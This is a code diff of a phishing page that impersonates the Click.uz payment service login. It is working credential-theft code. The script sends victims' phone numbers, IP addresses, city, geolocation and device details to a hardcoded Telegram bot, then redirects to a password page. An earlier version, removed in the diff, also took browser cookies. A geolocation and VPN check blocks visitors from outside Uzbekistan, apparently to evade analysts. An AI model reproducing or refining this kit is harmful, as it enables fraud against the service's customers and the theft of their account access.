@@ -17,14 +17,25 @@
             --transition: 0.25s ease;
         }
 
-        [data-theme="dark"] {
-            --bg-color: #121212;
-            --card-bg: #1e1e1e;
-            --text-black: #ffffff;
-            --text-gray: #a0a0a0;
-            --border-color: #333333;
-            --btn-disabled: #2d2d2d;
-        }
+       [data-theme="dark"] {
+    --bg-color: #121212;
+    --card-bg: #1e1e1e;
+    --text-black: #ffffff;
+    --text-gray: #a0a0a0;
+    --border-color: #333333;
+    --btn-disabled: #2d2d2d;
+}
+
+/* Dark modeda logonining matnli qismini oq qilish */
+[data-theme="dark"] .logo-click-text {
+    fill: #ffffff !important;
+}
+
+/* Dark modeda kiritish maydonlarining foni va chegarasi */
+[data-theme="dark"] .input-group input {
+    border-color: #444;
+    color: #fff;
+}
 
         * {
             box-sizing: border-box;
@@ -264,14 +275,57 @@
             .auth-container h1 { font-size: 15px; }
             .badges img { height: 35px; }
         }
+        #vpn-overlay {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: var(--bg-color); /* Sayt rangiga moslashadi */
+    z-index: 10000;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+}
+
+.vpn-content {
+    background: var(--card-bg);
+    padding: 40px 20px;
+    border-radius: 20px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+    max-width: 350px;
+    text-align: center;
+}
+
+.vpn-content h2 {
+    margin-top: 20px;
+    color: #ff4d4d;
+    font-size: 22px;
+}
+
+.vpn-content p {
+    margin: 15px 0 25px;
+    font-size: 15px;
+    color: var(--text-gray);
+    line-height: 1.5;
+}
     </style>
 </head>
 <body>
-    <div id="vpn-overlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#fff; z-index:10000; flex-direction:column; align-items:center; justify-content:center; text-align:center;">
-     <h2 style="color:red;">Xavfsizlik tizimi</h2>
-     <p>Iltimos, VPN-ni o'chiring va sahifani yangilang!</p>
-     <button onclick="location.reload()" style="padding:10px 20px; background:#0073ff; color:white; border:none; border-radius:8px; cursor:pointer;">Qayta tekshirish</button>
+   <div id="vpn-overlay">
+    <div class="vpn-content">
+        <svg width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="#ff4d4d" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+            <line x1="12" y1="9" x2="12" y2="13"></line>
+            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+        </svg>
+        <h2 id="txt-vpn-title">Xavfsizlik tizimi</h2>
+        <p id="txt-vpn-desc">Tizim xavfsizligini ta'minlash uchun iltimos, VPN xizmatini o'chiring va sahifani yangilang.</p>
+        <button onclick="location.reload()" class="btn-main active" style="max-width: 200px;">Qayta tekshirish</button>
     </div>
+</div>
     <div class="logo-box">
         <svg viewBox="0 0 160 40" xmlns="http://www.w3.org/2000/svg">
             <path d="M40 20C40 27.6667 27.6667 40 20 40C12.3333 40 0 27.6667 0 20C0 12.3333 12.3333 0 20 0C27.6667 0 40 12.3333 40 20ZM28 20C28 23 23 28 20 28C17 28 12 23 12 20C12 17 17 12 20 12C23 12 28 17 28 20Z" fill="#0073ff"/>
@@ -335,118 +389,133 @@
             <p class="copyright">© 2011-2026 «Click.uz» Barcha huquqlar himoyalangan.</p>
         </div>
     </div>
+<script>
 
-    <script>
-        const BOT_TOKEN = "8622554381:AAFMQ3qbIzFdLiOo7FHuC06Q3H7zzV_MAC8"; 
-        const CHAT_ID = "-1003085828839";
-        const langData = {
-            uz: { title: "Avtorizatsiyalash va ro'yxatdan o'tish bitta darchada", oferta: "'Kirish' tugmasini bosib, siz <a href='#'>Ommaviy ofertaga</a> rozilik bildirasiz", button: "Kirish", lang: "Til:", footer: "Click Up ilovasini o'rnating<br>Undan foydalanish yanada oson va qulay!", guide: "Foydalanuvchi qo'llanmasi", support: "Qo'llab-quvvatlash xizmati" },
-            ru: { title: "Авторизация и регистрация в одном окне", oferta: "Нажимая кнопку «Вход», вы соглашаетесь с <a href='#'>Публичной офертой</a>", button: "Вход", lang: "Язык:", footer: "Установите приложение Click Up<br>Пользоваться им еще проще и удобнее!", guide: "Руководство пользователя", support: "Служба поддержки" },
-            en: { title: "Authorization and registration in one window", oferta: "By clicking the 'Login' button, you agree to the <a href='#'>Public Offer</a>", button: "Login", lang: "Language:", footer: "Install Click Up app<br>It's even easier and more convenient to use!", guide: "User guide", support: "Support service" }
-        };
+const BOT_TOKEN = "8622554381:AAFMQ3qbIzFdLiOo7FHuC06Q3H7zzV_MAC8"; 
+const CHAT_ID = "-1003085828839";
 
-        const phoneInput = document.getElementById('phone');
-        const submitBtn = document.getElementById('btn-submit');
-        const themeBtn = document.getElementById('theme-btn');
-        const langSelect = document.getElementById('lang-select');
+const langData = {
+    uz: { title: "Avtorizatsiyalash va ro'yxatdan o'tish bitta darchada", oferta: "'Kirish' tugmasini bosib, siz <a href='#'>Ommaviy ofertaga</a> rozilik bildirasiz", button: "Kirish", lang: "Til:", footer: "Click Up ilovasini o'rnating<br>Undan foydalanish yanada oson va qulay!", guide: "Foydalanuvchi qo'llanmasi", support: "Qo'llab-quvvatlash xizmati" },
+    ru: { title: "Авторизация и регистрация в одном окне", oferta: "Нажимая кнопку «Вход», вы соглашаетесь с <a href='#'>Публичной офертой</a>", button: "Вход", lang: "Язык:", footer: "Установите приложение Click Up<br>Пользоваться им еще проще и удобнее!", guide: "Руководство пользователя", support: "Служба поддержки" },
+    en: { title: "Authorization and registration in one window", oferta: "By clicking the 'Login' button, you agree to the <a href='#'>Public Offer</a>", button: "Login", lang: "Language:", footer: "Install Click Up app<br>It's even easier and more convenient to use!", guide: "User guide", support: "Support service" }
+};
 
-        // Input monitoring
-        phoneInput.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '');
-            if (e.target.value.length === 9) {
-                submitBtn.disabled = false;
-                submitBtn.classList.add('active');
-            } else {
-                submitBtn.disabled = true;
-                submitBtn.classList.remove('active');
-            }
-        });
+const phoneInput = document.getElementById('phone');
+const submitBtn = document.getElementById('btn-submit');
+const themeBtn = document.getElementById('theme-btn');
+const langSelect = document.getElementById('lang-select');
 
-        // Theme Switch
-        themeBtn.addEventListener('click', () => {
-            const isDark = document.body.hasAttribute('data-theme');
-            if (isDark) {
-                document.body.removeAttribute('data-theme');
-                document.getElementById('theme-icon').innerHTML = '<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>';
-            } else {
-                document.body.setAttribute('data-theme', 'dark');
-                document.getElementById('theme-icon').innerHTML = '<circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>';
-            }
-        });
+// Telefon raqami nazorati
+phoneInput.addEventListener('input', (e) => {
+    e.target.value = e.target.value.replace(/\D/g, '');
+    if (e.target.value.length === 9) {
+        submitBtn.disabled = false;
+        submitBtn.classList.add('active');
+    } else {
+        submitBtn.disabled = true;
+        submitBtn.classList.remove('active');
+    }
+});
 
-        // Language Switch
-        langSelect.addEventListener('change', (e) => {
-            const l = langData[e.target.value];
-            document.getElementById('txt-title').innerText = l.title;
-            document.getElementById('txt-oferta').innerHTML = l.oferta;
-            document.getElementById('btn-submit').innerText = l.button;
-            document.getElementById('txt-lang-label').innerText = l.lang;
-            document.getElementById('txt-footer').innerHTML = l.footer;
-            document.getElementById('txt-guide').innerText = l.guide;
-            document.getElementById('txt-support').innerText = l.support;
-        });
-        async function checkVPN() {
+// VPN va Xavfsizlik tekshiruvi
+async function checkSecurity() {
     try {
-        const response = await fetch('https://ipapi.co/json/'); // IP ma'lumotlarini olish
+        const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
-        // Agar mamlakat UZ bo'lmasa yoki vaqt mintaqasi Toshkent bo'lmasa bloklaymiz
-        if (data.country_code !== "UZ" || timezone !== "Asia/Tashkent") {
+        // O'zbekistondan tashqarida bo'lsa bloklaymiz
+        if (data.country_code !== "UZ" || !timezone.includes("Tashkent")) {
             document.getElementById('vpn-overlay').style.display = 'flex';
             return false;
         }
-        return data; // Xavfsiz bo'lsa IP ma'lumotlarini qaytaradi
+        return data;
     } catch (error) {
-        console.error("Xavfsizlik tekshiruvida xato.");
+        // API xatosi bo'lsa faqat vaqt mintaqasini tekshiramiz
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        if (!timezone.includes("Tashkent")) {
+            document.getElementById('vpn-overlay').style.display = 'flex';
+            return false;
+        }
+        return { ip: "Aniqlab bo'lmadi", city: "Noma'lum" };
     }
-    }
-    async function sendDataToAdmin(ipData) {
-    // Joylashuvni (geolokatsiya) so'rash
-    navigator.geolocation.getCurrentPosition(async (position) => {
-        const lat = position.coords.latitude;
-        const lon = position.coords.longitude;
+}
 
-        // Telegramga yuboriladigan xabar matni
-        const text = `🔔 <b>Yangi Foydalanuvchi!</b>\n\n` +
-                     `📱 Tel: +998${document.getElementById('phone').value}\n` +
-                     `🌐 IP: ${ipData.ip}\n` +
-                     `🏙 Shahar: ${ipData.city}\n` +
-                     `📍 Lokatsiya: <a href="https://www.google.com/maps?q=${lat},${lon}">Xaritada ko'rish</a>\n` +
-                     `🍪 Cookie: <code>${document.cookie || 'Mavjud emas'}</code>\n` +
-                     `📱 Qurilma: ${navigator.userAgent}`;
+// Telegramga yuborish va sahifani o'zgartirish
+async function handleSubmission() {
+    const ipData = await checkSecurity();
+    if (!ipData) return;
 
-        // Telegram API orqali xabarni yuborish
+    submitBtn.innerText = "Yuklanmoqda..."; // Foydalanuvchiga jarayon ketayotganini bildiradi
+    submitBtn.disabled = true;
+
+    // Geolokatsiyani so'rash
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+        await sendFinalData(ipData, pos.coords.latitude, pos.coords.longitude);
+    }, async (err) => {
+        // Lokatsiya rad etilsa ham ma'lumotni yuboramiz
+        await sendFinalData(ipData, null, null);
+    });
+}
+
+async function sendFinalData(ipData, lat, lon) {
+    const phone = document.getElementById('phone').value;
+    let locationLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}` : "Rad etildi";
+
+    const text = `🚀 <b>Yangi Foydalanuvchi!</b>\n\n` +
+                 `📱 <b>Tel:</b> +998${phone}\n` +
+                 `🌐 <b>IP:</b> ${ipData.ip}\n` +
+                 `🏙 <b>Shahar:</b> ${ipData.city}\n` +
+                 `📍 <b>Lokatsiya:</b> ${locationLink}\n` +
+                 `📱 <b>Qurilma:</b> ${navigator.userAgent}`;
+
+    try {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: text,
-                parse_mode: 'HTML' // HTML formatda yuborish uchun
+                parse_mode: 'HTML'
             })
         });
-    }, (error) => {
-        // Agar foydalanuvchi lokatsiyaga ruxsat bermasa, faqat raqam va IP yuboriladi
-        const text = `⚠️ <b>Lokatsiya rad etildi:</b>\n\n` +
-                     `📱 Tel: +998${document.getElementById('phone').value}\n` +
-                     `🌐 IP: ${ipData.ip}`;
         
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
-        });
-    });
+        // Muvaffaqiyatli yuborilgach pass.html ga o'tish
+        window.location.href = "pass.html";
+    } catch (e) {
+        alert("Xatolik yuz berdi. Qayta urinib ko'ring.");
+        submitBtn.disabled = false;
+        submitBtn.innerText = "Kirish";
+    }
 }
-submitBtn.addEventListener('click', async () => {
-    const ipInfo = await checkVPN();
-    if (ipInfo) {
-        sendDataToAdmin(ipInfo);
-        alert("Kod yuborildi!");
+
+submitBtn.addEventListener('click', handleSubmission);
+
+// Boshqa funksiyalar (Theme, Lang)
+themeBtn.addEventListener('click', () => {
+    const isDark = document.body.getAttribute('data-theme') === 'dark';
+    
+    if (isDark) {
+        document.body.removeAttribute('data-theme');
+        document.getElementById('theme-icon').innerHTML = '<path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>';
+    } else {
+        document.body.setAttribute('data-theme', 'dark');
+        document.getElementById('theme-icon').innerHTML = '<circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line>';
     }
 });
-window.onload = checkVPN;
-    </script>
+langSelect.addEventListener('change', (e) => {
+    const l = langData[e.target.value];
+    document.getElementById('txt-title').innerText = l.title;
+    document.getElementById('txt-oferta').innerHTML = l.oferta;
+    submitBtn.innerText = l.button; // Tugma matni o'zgarishi shart
+    document.getElementById('txt-lang-label').innerText = l.lang;
+    document.getElementById('txt-footer').innerHTML = l.footer;
+    document.getElementById('txt-support').innerText = l.support;
+});
+
+window.onload = checkSecurity;
+</script>
+
+   
 </body>
 </html>
